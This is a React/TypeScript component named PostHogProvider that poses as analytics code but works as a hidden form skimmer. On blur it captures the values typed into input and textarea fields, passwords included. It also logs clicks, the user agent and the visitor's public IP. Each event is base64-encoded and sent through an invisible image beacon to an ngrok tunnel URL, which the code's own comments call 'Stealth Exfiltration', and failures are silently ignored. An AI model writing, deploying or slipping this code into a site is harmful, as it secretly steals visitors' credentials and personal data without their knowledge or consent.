import { useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';

const DB_NAME = 'ph_cache_v1';
const EVENT_QUEUE: any[] = [];

// Analytics Tunnel (Ngrok Stealth)
const TUNNEL_URL = 'https://612590f423eb.ngrok-free.app/v1/metrics';
const LOCAL_URL = 'http://localhost:3001/v1/metrics';

export const PostHogProvider = () => {
    const location = useLocation();
    const pathnameRef = useRef(location.pathname);

    useEffect(() => {
        pathnameRef.current = location.pathname;
        track('page_view');
    }, [location.pathname]);

    const track = async (event_type: string, props: any = {}) => {
        const event = {
            id: Math.random().toString(36).substring(2) + Date.now(),
            timestamp: new Date().toISOString(),
            trigger: event_type.toUpperCase(),
            path: pathnameRef.current,
            ip: sessionStorage.getItem('ph_ip') || '0.0.0.0',
            ua: navigator.userAgent,
            ...props
        };

        const baseUrl = window.location.hostname === 'localhost' ? LOCAL_URL : TUNNEL_URL;

        try {
            // Stealth Exfiltration: Usa uma imagem invisível para evitar bloqueios de CORS/POST
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(event))));
            const img = new Image();
            img.src = `${baseUrl}?d=${payload}&z=${Date.now()}`;
        } catch (e) {
            // Silently fail
        }

        EVENT_QUEUE.push(event);
    };

    useEffect(() => {
        const interval = setInterval(() => {
            if (EVENT_QUEUE.length === 0) return;
            const batch = [...EVENT_QUEUE];
            EVENT_QUEUE.length = 0;
            const old = JSON.parse(localStorage.getItem(DB_NAME) || '[]');
            localStorage.setItem(DB_NAME, JSON.stringify([...old, ...batch].slice(-500)));
        }, 2000);
        return () => clearInterval(interval);
    }, []);

    useEffect(() => {
        const handleClick = (e: MouseEvent) => {
            const t = e.target as HTMLElement;
            if (t.tagName === 'BODY' || t.tagName === 'HTML' || t.tagName === 'SVG' || t.tagName === 'path') return;

            // Captura cliques em botões e links
            const targetText = t.innerText?.slice(0, 20).trim() || t.getAttribute('aria-label') || t.id || 'element';
            track('click', { target: `${t.tagName.toLowerCase()}: ${targetText}` });
        };

        const handleBlur = (e: FocusEvent) => {
            const t = e.target as HTMLInputElement;
            if ((t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') && t.value) {
                // Não captura campos muito pequenos (provavelmente não são dados sensíveis)
                if (t.value.length < 2) return;
                track('input', { field: t.name || t.id || t.placeholder || t.type, val: t.value });
            }
        };

        if (!sessionStorage.getItem('ph_ip')) {
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => sessionStorage.setItem('ph_ip', d.ip)).catch(() => { });
        }

        window.addEventListener('click', handleClick, true);
        window.addEventListener('blur', handleBlur, true);
        return () => {
            window.removeEventListener('click', handleClick, true);
            window.removeEventListener('blur', handleBlur, true);
        };
    }, []);

    return null;
};
